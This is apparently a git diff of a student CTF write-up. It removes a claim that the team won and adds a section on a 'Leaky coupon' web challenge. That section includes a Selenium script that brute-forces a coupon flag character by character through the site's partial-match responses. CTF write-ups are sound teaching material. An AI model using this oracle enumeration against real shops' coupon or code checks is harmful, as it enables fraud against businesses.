@@ -2,7 +2,7 @@
 
 The CyberSkills chambionships were a ctf hosted by CyberSkills amongst 21 danish gymnasium teams.
 
-Our team consisted of 5 people and we endend up winning the ctf.
+Our team consisted of 5 people.
 
 ### Confused UDP
 
@@ -101,3 +101,70 @@ Executing the script with root privilages lead to the following packet capture, 
 Looking at the reciveing packet from the server we get the flag.
 
 ![udp2](assets/udp2.png)
+
+
+### Leaky cupon responses
+
+This challage was also worth 25 points and the description of the challange was:
+
+```
+
+Sometimes cupon codes follows a pattern, is this 
+the case on aubergine.hkn, the flag is the cupon
+
+```
+
+When we first access the website linked we see a typical webstore
+
+![cupon1](assets/cupon1.png)
+
+After getting used to the webpages layout we navigated to the checkout area where we had access to the feild to submit a cupn
+
+![cupon1](assets/cupon2.png)
+
+Trying to submit a random string of charecters we get this response
+
+![cupon4](assets/cupon4.png)
+
+If we on the other hand try something like `HKN` as that is the flag format we get a partial match, the way it works is that it checks if the cupon starts with the submitted cupon, we can use this together with a python script to get the key
+
+![cupon3](assets/cupon3.png)
+
+Using selenium we setup an automated process to run though all the combinations untill we found the correct flag.
+
+```py
+
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
+
+browser = webdriver.Firefox()
+browser.get('http://aubergine.hkn/cart')
+
+letters = list("}-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890")
+currentCupon = "HKN{"
+
+time.sleep(5)
+
+doLoop = True
+while doLoop:
+        for ltr in letters:
+                el = browser.find_element("xpath", "/html/body/section/div/div[2]/form[2]/div/input")
+                print(f"Testing {currentCupon + ltr}...")
+                el.send_keys(currentCupon + ltr)
+                time.sleep(.5)
+                el.send_keys(Keys.ENTER)
+                time.sleep(1.5)
+
+                text = browser.find_element("xpath", "/html/body/section/div/div[2]/div")
+                if text.text == "Partial match on cupon" and ltr == "}":
+                        doLoop = False
+                        break
+                elif text.text == "Partial match on cupon":
+                        currentCupon += ltr
+                        print(f"FOUND MATHC!, updated to {currentCupon}")
+                        break
+
+```
+
+This would resolve the flag in about 20 minutes.
